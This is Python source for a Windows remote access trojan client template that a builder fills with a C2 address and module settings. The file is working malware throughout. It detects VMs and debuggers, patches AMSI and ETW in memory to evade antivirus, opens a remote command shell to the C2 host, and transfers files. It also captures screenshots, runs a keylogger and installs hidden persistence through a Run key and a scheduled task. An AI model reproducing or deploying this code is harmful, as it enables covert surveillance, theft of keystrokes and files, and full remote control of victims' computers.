#!/usr/bin/env python3
"""
Windows RAT client — connects to C2, executes modules, evades AV.
This is the template that gets assembled with config + modules + evasion.
"""
import os
import sys
import json
import base64
import socket
import struct
import time
import threading
import subprocess
import ctypes
import hashlib
import platform as plat

# ─── Embedded config (filled by builder) ─────────────────────────────────────
CONFIG_B64 = "__CONFIG_B64__"
MODULES_B64 = "__MODULES_B64__"
EVASION_B64 = "__EVASION_B64__"

# ─── Decode embedded data ────────────────────────────────────────────────────
_config = json.loads(base64.b64decode(CONFIG_B64))
_modules = json.loads(base64.b64decode(MODULES_B64))
_evasion = json.loads(base64.b64decode(EVASION_B64))

C2_HOST = _config["c2_host"]
C2_PORT = _config["c2_port"]
MAGIC = b"PHNT"

# ─── Wire protocol ───────────────────────────────────────────────────────────
CMD_REGISTER=0x01; CMD_HEARTBEAT=0x02
CMD_SHELL=0x10; CMD_SHELL_RESP=0x11
CMD_UPLOAD=0x20; CMD_DOWNLOAD=0x21; CMD_FILE_RESP=0x22
CMD_SCREEN=0x30; CMD_SCREEN_RESP=0x31
CMD_KEYLOG=0x40; CMD_KEYLOG_RESP=0x41
CMD_SYSINFO=0x50; CMD_SYSINFO_RESP=0x51
CMD_PROCESS=0x60; CMD_PROCESS_RESP=0x61
CMD_PERSIST=0x70; CMD_PERSIST_RESP=0x71
CMD_EXIT=0xFF

def pack_msg(cmd_type, data):
    if isinstance(data, str): data = data.encode()
    return struct.pack(">4sII", MAGIC, cmd_type, len(data)) + data

def recv_msg(sock):
    header = recv_exact(sock, 12)
    if not header: return None, None
    magic, cmd_type, data_len = struct.unpack(">4sII", header)
    if magic != MAGIC: return None, None
    data = recv_exact(sock, data_len) if data_len else b""
    return cmd_type, data

def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        try:
            chunk = sock.recv(n - len(buf))
            if not chunk: return None
            buf += chunk
        except: return None
    return buf

# ─── Evasion checks ──────────────────────────────────────────────────────────
def run_evasion_checks():
    """Run evasion checks before connecting."""
    if not _evasion:
        return True

    # Anti-VM check
    if "anti_vm" in _evasion:
        if is_vm():
            return False

    # Anti-debug check
    if "anti_debug" in _evasion:
        if is_debugged():
            return False

    return True

def is_vm():
    """Check if running in a VM."""
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
            r"HARDWARE\DESCRIPTION\System\BIOS", 0, winreg.KEY_READ) as k:
            for name in ("SystemManufacturer", "SystemProductName"):
                try:
                    val, _ = winreg.QueryValueEx(k, name)
                    v = str(val).lower()
                    if any(x in v for x in ["vmware", "virtualbox", "vbox", "qemu", "xen", "hyper-v"]):
                        return True
                except: pass
    except: pass
    return False

def is_debugged():
    """Check if a debugger is present."""
    try:
        k32 = ctypes.WinDLL("kernel32")
        if k32.IsDebuggerPresent():
            return True
        ntdll = ctypes.WinDLL("ntdll")
        proc = k32.GetCurrentProcess()
        port = ctypes.c_void_p()
        ret = ctypes.c_ulong(0)
        st = ntdll.NtQueryInformationProcess(proc, 7, ctypes.byref(port),
            ctypes.sizeof(port), ctypes.byref(ret))
        if st == 0 and port.value:
            return True
    except: pass
    return False

# ─── AMSI + ETW patching ────────────────────────────────────────────────────
def patch_amsi():
    """Patch AMSI in-memory to bypass script scanning."""
    try:
        from ctypes import wintypes
        k32 = ctypes.WinDLL("kernel32")
        # Load amsi.dll
        h = k32.LoadLibraryA(b"amsi.dll")
        if not h: return False
        # Find AmsiScanBuffer
        scan = k32.GetProcAddress(h, b"AmsiScanBuffer")
        if not scan: return False
        # Patch first bytes with: mov eax, 0x80070057 (E_INVALIDARG); ret
        # 33 D2              xor edx, edx
        # B8 57 00 07 80     mov eax, 0x80070057
        # C3                 ret
        patch = b"\x33\xD2\xB8\x57\x00\x07\x80\xC3"
        old_prot = wintypes.DWORD(0)
        k32.VirtualProtect(scan, len(patch), 0x40, ctypes.byref(old_prot))  # PAGE_EXECUTE_READWRITE
        ctypes.memmove(scan, patch, len(patch))
        k32.VirtualProtect(scan, len(patch), old_prot.value, ctypes.byref(old_prot))
        return True
    except Exception:
        return False

def patch_etw():
    """Patch EtwEventWrite to suppress telemetry."""
    try:
        from ctypes import wintypes
        k32 = ctypes.WinDLL("kernel32")
        ntdll = ctypes.WinDLL("ntdll")
        # Find EtwEventWrite
        etw = k32.GetProcAddress(ntdll._handle, b"EtwEventWrite")
        if not etw: return False
        # Patch: ret (0xC3)
        patch = b"\xC3"
        old_prot = wintypes.DWORD(0)
        k32.VirtualProtect(etw, len(patch), 0x40, ctypes.byref(old_prot))
        ctypes.memmove(etw, patch, len(patch))
        k32.VirtualProtect(etw, len(patch), old_prot.value, ctypes.byref(old_prot))
        return True
    except Exception:
        return False

# ─── Module handlers ─────────────────────────────────────────────────────────
def handle_shell(cmd_data):
    """Execute a shell command."""
    cmd = cmd_data.decode("utf-8", "replace")
    try:
        p = subprocess.run(
            ["cmd.exe", "/c"] + cmd.split(),
            capture_output=True, timeout=60,
            creationflags=0x08000000  # CREATE_NO_WINDOW
        )
        return p.stdout + p.stderr
    except Exception as e:
        return str(e).encode()

def handle_download(path_data):
    """Read a file for download."""
    path = path_data.decode("utf-8", "replace")
    try:
        with open(path, "rb") as f:
            return f.read()
    except Exception as e:
        return str(e).encode()

def handle_upload(data):
    """Write uploaded file. Format: [path_len(4)][path][content]"""
    if len(data) < 4: return b"error"
    path_len = struct.unpack(">I", data[:4])[0]
    path = data[4:4+path_len].decode("utf-8", "replace")
    content = data[4+path_len:]
    try:
        with open(path, "wb") as f:
            f.write(content)
        return b"ok"
    except Exception as e:
        return str(e).encode()

def handle_sysinfo(data):
    """Gather system information."""
    info = {
        "hostname": os.environ.get("COMPUTERNAME", "unknown"),
        "os": f"Windows {plat.version()}",
        "arch": plat.machine(),
        "user": os.environ.get("USERNAME", "unknown"),
        "pid": os.getpid(),
        "python": sys.version.split()[0],
    }
    try:
        # Get network interfaces
        info["ip"] = socket.gethostbyname(socket.gethostname())
    except: pass
    return json.dumps(info).encode()

def handle_process(data):
    """List or kill processes."""
    cmd = data.decode("utf-8", "replace")
    if cmd.startswith("list"):
        try:
            out = subprocess.check_output(
                ["tasklist.exe", "/FO", "CSV", "/NH"],
                creationflags=0x08000000, text=True
            )
            return out.encode()
        except Exception as e:
            return str(e).encode()
    elif cmd.startswith("kill "):
        pid = int(cmd[5:])
        try:
            k32 = ctypes.WinDLL("kernel32")
            h = k32.OpenProcess(0x0001, False, pid)  # PROCESS_TERMINATE
            if h:
                k32.TerminateProcess(h, 1)
                k32.CloseHandle(h)
                return b"ok"
            return b"failed"
        except Exception as e:
            return str(e).encode()
    return b"unknown"

def handle_persist(data):
    """Install persistence."""
    method = data.decode("utf-8", "replace")
    try:
        import winreg
        if method == "run_key":
            exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "AbsoluteRatloggerUpdate", 0, winreg.REG_SZ, exe)
            return b"ok: run key installed"
        elif method == "sched_task":
            exe = sys.executable if getattr(sys, 'frozen', False) else f"python {os.path.abspath(__file__)}"
            subprocess.run(["schtasks.exe", "/Create", "/F", "/SC", "ONLOGON",
                "/TN", "AbsoluteRatloggerUpdate", "/TR", f'"{exe}"'],
                capture_output=True, creationflags=0x08000000)
            return b"ok: scheduled task installed"
    except Exception as e:
        return str(e).encode()

def handle_screen(data):
    """Capture screen."""
    try:
        from PIL import ImageGrab
        import io
        img = ImageGrab.grab(all_screens=False)
        if img.mode != "RGB": img = img.convert("RGB")
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=60)
        return buf.getvalue()
    except ImportError:
        return b"error: Pillow not installed"
    except Exception as e:
        return str(e).encode()

def handle_keylog(data):
    """Start/stop keylogger."""
    action = data.decode("utf-8", "replace")
    if action == "start":
        threading.Thread(target=keylog_thread, daemon=True).start()
        return b"ok: keylogger started"
    elif action == "stop":
        _keylog_running.clear()
        return b"ok: keylogger stopped"
    elif action == "dump":
        return "".join(_keylog_buffer).encode()
    return b"unknown"

_keylog_running = threading.Event()
_keylog_buffer = []

def keylog_thread():
    """Keylogger background thread."""
    _keylog_running.set()
    user32 = ctypes.WinDLL("user32", use_last_error=True)
    user32.GetAsyncKeyState.argtypes = [ctypes.c_int]
    user32.GetAsyncKeyState.restype = ctypes.c_short
    prev = [False] * 256
    while _keylog_running.is_set():
        for vk in range(0x08, 0xFF):
            if 0x01 <= vk <= 0x06: continue
            s = user32.GetAsyncKeyState(vk)
            down = bool(s & 0x8000)
            if down and not prev[vk]:
                if 0x41 <= vk <= 0x5A:
                    shift = bool(user32.GetAsyncKeyState(0x10) & 0x8000)
                    ch = chr(vk) if shift else chr(vk + 32)
                    _keylog_buffer.append(ch)
                elif 0x30 <= vk <= 0x39:
                    _keylog_buffer.append(chr(vk))
                elif vk == 0x0D:
                    _keylog_buffer.append("\n")
                elif vk == 0x20:
                    _keylog_buffer.append(" ")
            prev[vk] = down
        time.sleep(0.01)

# ─── Main client loop ────────────────────────────────────────────────────────
def main():
    # Run evasion checks
    if not run_evasion_checks():
        sys.exit(0)

    # Apply AMSI + ETW patches if requested
    if "amsi_bypass" in _evasion:
        patch_amsi()
    if "etw_patch" in _evasion:
        patch_etw()

    # Connect to C2
    session_id = os.getpid() & 0xFFFF

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((C2_HOST, C2_PORT))

            # Register
            reg = json.dumps({
                "hostname": os.environ.get("COMPUTERNAME", socket.gethostname()),
                "os": f"Windows {plat.version()}",
                "user": os.environ.get("USERNAME", "unknown"),
                "arch": plat.machine(),
                "pid": os.getpid(),
                "seed": "absolutespy",  # Fixed seed for demo — real impl would be dynamic
            }).encode()
            sock.sendall(pack_msg(CMD_REGISTER, reg))

            # Command loop
            while True:
                cmd_type, data = recv_msg(sock)
                if cmd_type is None:
                    break

                resp = b""
                if cmd_type == CMD_SHELL:
                    resp = handle_shell(data)
                    sock.sendall(pack_msg(CMD_SHELL_RESP, resp))
                elif cmd_type == CMD_DOWNLOAD:
                    resp = handle_download(data)
                    sock.sendall(pack_msg(CMD_FILE_RESP, resp))
                elif cmd_type == CMD_UPLOAD:
                    resp = handle_upload(data)
                    sock.sendall(pack_msg(CMD_FILE_RESP, resp))
                elif cmd_type == CMD_SYSINFO:
                    resp = handle_sysinfo(data)
                    sock.sendall(pack_msg(CMD_SYSINFO_RESP, resp))
                elif cmd_type == CMD_PROCESS:
                    resp = handle_process(data)
                    sock.sendall(pack_msg(CMD_PROCESS_RESP, resp))
                elif cmd_type == CMD_PERSIST:
                    resp = handle_persist(data)
                    sock.sendall(pack_msg(CMD_PERSIST_RESP, resp))
                elif cmd_type == CMD_SCREEN:
                    resp = handle_screen(data)
                    sock.sendall(pack_msg(CMD_SCREEN_RESP, resp))
                elif cmd_type == CMD_KEYLOG:
                    resp = handle_keylog(data)
                    sock.sendall(pack_msg(CMD_KEYLOG_RESP, resp))
                elif cmd_type == CMD_EXIT:
                    break

            sock.close()

        except (ConnectionError, socket.timeout, OSError):
            pass
        except Exception:
            pass

        time.sleep(5)  # Reconnect delay

if __name__ == "__main__":
    main()
